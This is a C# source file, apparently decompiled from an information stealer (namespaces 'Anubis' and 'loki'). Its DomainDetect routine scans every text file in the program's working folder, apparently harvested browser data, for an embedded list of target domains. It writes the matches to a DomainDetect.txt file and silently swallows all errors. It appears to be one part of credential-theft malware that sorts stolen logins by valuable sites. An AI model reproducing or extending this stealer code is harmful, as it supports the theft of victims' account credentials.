using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using loki;
using loki.Properties;

namespace Anubis;

public class DomainDetect
{
	public static void Start(string Browser)
	{
		try
		{
			Encoding uTF = Encoding.UTF8;
			List<string> list = (from w in Resources.Domains.Split()
				select w.Trim() into w
				where w != ""
				select w.ToLower()).ToList();
			FileInfo[] files = new DirectoryInfo(Program.dir).GetFiles("*.txt", SearchOption.AllDirectories);
			List<string> list2 = new List<string>();
			FileInfo[] array = files;
			foreach (FileInfo fileInfo in array)
			{
				list2.AddRange(File.ReadAllLines(fileInfo.FullName, uTF));
				Console.WriteLine(fileInfo.FullName);
			}
			HashSet<string> hashSet = new HashSet<string>();
			foreach (string item in list2)
			{
				foreach (string item2 in (from w in item.Split()
					select w.Trim() into w
					where w != ""
					select w.ToLower()).ToList())
				{
					if (!hashSet.Contains(item2))
					{
						hashSet.Add(item2);
					}
				}
			}
			HashSet<string> hashSet2 = new HashSet<string>();
			foreach (string item3 in list)
			{
				foreach (string item4 in hashSet)
				{
					if (item4.Contains(item3) && !hashSet2.Contains(item3))
					{
						hashSet2.Add(item3);
					}
				}
			}
			File.WriteAllLines(Browser + "\\DomainDetect.txt", hashSet2, Encoding.Default);
			string.Join(", ", hashSet2);
		}
		catch
		{
		}
	}
}
